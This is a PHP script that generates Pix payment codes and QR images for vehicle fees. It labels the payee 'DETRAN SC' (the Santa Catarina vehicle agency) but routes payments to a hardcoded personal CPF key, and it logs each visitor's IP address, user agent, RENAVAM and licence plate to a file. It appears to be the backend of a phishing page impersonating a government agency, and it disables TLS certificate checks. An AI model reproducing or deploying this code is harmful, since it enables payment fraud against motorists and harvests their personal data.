<?php
header('Content-Type: application/json; charset=utf-8');
try {
  $raw = file_get_contents('php://input');
  $input = json_decode($raw, true);
  if (!is_array($input)) { $input = $_POST; }
  $valorRaw = isset($input['valor']) ? $input['valor'] : 0;
  $descricao = isset($input['descricao']) ? trim($input['descricao']) : '';
  $renavam = isset($input['renavam']) ? trim((string)$input['renavam']) : '';
  $placa = isset($input['placa']) ? trim((string)$input['placa']) : '';
  $cfgPath = __DIR__ . '/pix_config.json';
  $cfg = is_file($cfgPath) ? json_decode(@file_get_contents($cfgPath), true) : null;
  $cpf = '06721661195';
  if (is_array($cfg) && !empty($cfg['pixKey'])) { $cpf = (string)$cfg['pixKey']; }
  $valor = 0.0;
  if (is_numeric($valorRaw)) { $valor = floatval($valorRaw); }
  else { $valor = floatval(str_replace(',', '.', preg_replace('/[^\d\.,-]/', '', (string)$valorRaw))); }
  if ($valor <= 0) { echo json_encode(['error' => 'Valor inválido']); exit; }
  $amountNumber = number_format($valor, 2, '.', '');
  $descClean = $descricao;
  if (function_exists('transliterator_transliterate')) { $descClean = transliterator_transliterate('Any-Latin; Latin-ASCII', $descClean); }
  else { $descClean = @iconv('UTF-8', 'ASCII//TRANSLIT//IGNORE', $descClean); }
  $descClean = preg_replace('/\s+/u', '', (string)$descClean);
  $descClean = preg_replace('/[^A-Za-z0-9\-]/', '', (string)$descClean);
  $code = build_pix_emv($cpf, 'DETRAN SC', 'SANTA CATARINA', $amountNumber, $descClean, 'REF' . time());
  $b64 = qr_base64($code);
  $resp = ['code' => $code, 'qrcode_base64' => $b64, 'reference' => 'REF' . time()];
  @log_pix($descricao, $valor, $cpf, $renavam, $placa);
  echo json_encode($resp, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
} catch (Throwable $e) {
  echo json_encode(['error' => 'Falha interna']); 
}

function emv_len($v) { $l = strlen($v); return sprintf('%02d', $l); }
function emv_kv($id, $value) { return $id . emv_len($value) . $value; }
function build_pix_emv($key, $name, $city, $amount, $desc, $ref) {
  $name = mb_strtoupper(preg_replace('/[^A-Za-z0-9 \-]/', '', $name));
  $city = mb_strtoupper(preg_replace('/[^A-Za-z0-9 \-]/', '', $city));
  if ($name === '') $name = 'COMERCIO';
  if ($city === '') $city = 'CIDADE';
  $gui = emv_kv('00', 'BR.GOV.BCB.PIX');
  $infos = emv_kv('01', $key);
  if ($desc !== '') { $infos .= emv_kv('02', $desc); }
  $mai = emv_kv('26', $gui . $infos);
  $pfi = emv_kv('00', '01');
  $mcc = emv_kv('52', '0000');
  $cur = emv_kv('53', '986');
  $amt = emv_kv('54', $amount);
  $cty = emv_kv('58', 'BR');
  $mna = emv_kv('59', substr($name, 0, 25));
  $mci = emv_kv('60', substr($city, 0, 15));
  $add = emv_kv('05', $ref);
  $addt = emv_kv('62', $add);
  $base = $pfi . $mai . $mcc . $cur . $amt . $cty . $mna . $mci . $addt . '63' . '04';
  $crc = crc16($base);
  return $base . $crc;
}
function crc16($data) {
  $poly = 0x1021;
  $crc = 0xFFFF;
  $len = strlen($data);
  for ($i = 0; $i < $len; $i++) {
    $crc ^= (ord($data[$i]) << 8);
    for ($b = 0; $b < 8; $b++) {
      if ($crc & 0x8000) { $crc = ($crc << 1) ^ $poly; }
      else { $crc = ($crc << 1); }
      $crc &= 0xFFFF;
    }
  }
  return strtoupper(str_pad(dechex($crc), 4, '0', STR_PAD_LEFT));
}
function qr_base64($payload) {
  $url = 'https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' . urlencode($payload);
  $ch = curl_init();
  curl_setopt_array($ch, [
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 20,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
  ]);
  $png = curl_exec($ch);
  curl_close($ch);
  return $png ? ('data:image/png;base64,' . base64_encode($png)) : '';
}
function log_pix($descricao, $valor, $key, $renavam='', $placa='') {
  try {
    $path = __DIR__ . '/pix_log.json';
    $arr = [];
    if (is_file($path)) {
      $j = json_decode(@file_get_contents($path), true);
      if (is_array($j)) { $arr = $j; }
    }
    // Limit log size
    if (count($arr) > 1000) array_shift($arr);
    
    $arr[] = [
      'ts' => date('c'),
      'ip' => $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0',
      'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
      'descricao' => (string)$descricao,
      'valor' => (float)$valor,
      'valor_brl' => 'R$ ' . number_format((float)$valor, 2, ',', '.'),
      'key' => (string)$key,
      'renavam' => (string)$renavam,
      'placa' => (string)$placa,
    ];
    @file_put_contents($path, json_encode($arr, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT));
  } catch (\Throwable $e) {}
}
